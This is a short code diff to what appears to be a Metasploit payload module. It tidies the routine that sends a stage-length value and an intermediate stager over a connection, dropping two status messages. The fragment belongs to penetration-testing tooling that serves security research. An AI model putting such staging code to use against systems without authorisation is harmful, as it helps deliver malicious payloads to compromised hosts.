@@ -57,10 +57,8 @@ module MetasploitModule
     end
 
     stager_length = [ output_data.length ].pack('V')
-    print_status("Transmitting stage length value...(#{stager_length.length} bytes)")
-    conn.put( stager_length )
     print_status("Transmitting intermediate stager...(#{output_data.length} bytes)")
-    print_status("Transmitting intermediate stage...(#{output_data.unpack('H*')} )")
+    conn.put(stager_length)
     conn.put(output_data) == output_data.length
   end
 
